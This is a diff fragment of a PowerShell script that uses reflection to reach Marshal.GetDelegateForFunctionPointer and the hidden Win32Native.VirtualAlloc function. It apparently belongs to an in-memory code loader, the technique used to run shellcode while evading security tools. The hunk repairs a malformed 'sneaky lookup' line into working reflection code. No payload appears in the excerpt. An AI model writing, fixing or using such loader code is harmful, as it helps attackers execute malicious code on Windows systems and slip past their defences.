@@ -23,7 +23,10 @@ $Methods = [System.Runtime.InteropServices.Marshal].GetMethods()
 $GetDelegate = $Methods | Where-Object { $_.Name -eq "GetDelegateForFunctionPointer" -and $_.IsGenericMethod }
 
 # We find the address of VirtualAlloc using a sneaky lookup
-$vAllocAddr = [Runtime.InteropServices.Marshal]::GetHINSTANCE([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like "*mscorlib*" }).GetType("Microsoft.Win32.Win32Native").GetMethod("VirtualAlloc").MethodHandle.GetFunctionPointer()
+$mscore = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like "*mscorlib*" }
+$native = $mscore.GetType("Microsoft.Win32.Win32Native")
+$method = $native.GetMethod("VirtualAlloc", [Reflection.BindingFlags]"Static, Public, NonPublic")
+$vAllocAddr = $method.MethodHandle.GetFunctionPointer()
 
 # 5. Define the Delegate types (Using a simpler approach for PS 5.1)
 # We actually don't need a complex delegate if we use this 'Marshal' trick
